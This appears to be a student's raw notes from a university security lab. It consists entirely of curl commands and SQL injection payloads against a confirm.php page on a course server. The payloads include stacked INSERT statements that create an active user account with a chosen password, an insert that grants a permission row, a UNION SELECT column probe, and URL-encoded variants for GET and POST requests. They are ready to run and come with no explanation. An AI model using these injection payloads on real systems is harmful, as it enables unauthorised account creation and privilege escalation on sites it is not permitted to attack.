curl -G http://ugster21.student.cs.uwaterloo.ca/z63zhu/confirm.php 
curl -v -L -G --data-urlencode  "hash=cafebabe" http://ugster21.student.cs.uwaterloo.ca/z63zhu/confirm.php 

curl "${1}/confirm.php?hash=cafebabe--%3BINSERT%20INTO%20users%20%28username%2Cpassword%2Cconfirm%2Cactive%29%20VALUES%20%28%27z63zhu%27%2C%20%27zzz%27%2C%20%27%27%2C%201%29%2F%2A" 
INSERT INTO users(username,password,confirm,active) VALUES("z63zhu","zzz","",1) 

1 union select 1,2,3,4,5--
curl -c cookies "http://ugster21.student.cs.uwaterloo.ca/z63zhu/confirm.php/confirm.php?hash=1 union select 1,2,3,4,5--" 

curl -b cookies -c cookies --data "%27%3BINSERT+INTO+users%28username%2Cpassword%2Cconfirm%2Cactive%29+VALUES+%28%27z63zhu%27%2C%27zzz%27%2C%27%27%2C1%29--+&form=login&submit=Login" --location "http://ugster21.student.cs.uwaterloo.ca/z63zhu/confirm.php" 


; INSERT INTO ref (id_perm,id_user) VALUES (1,10)
%3B+INSERT+INTO+ref+%28id_perm%2Cid_user%29+VALUES+%281%2C10%29
';INSERT INTO users (username,password,confirm,active)VALUES ("z63zhu", "zzz", '', 1)--"
%27%3BINSERT+INTO+users%28username%2Cpassword%2Cconfirm%2Cactive%29+VALUES+%28%27z63zhu%27%2C%27zzz%27%2C%27%27%2C1%29--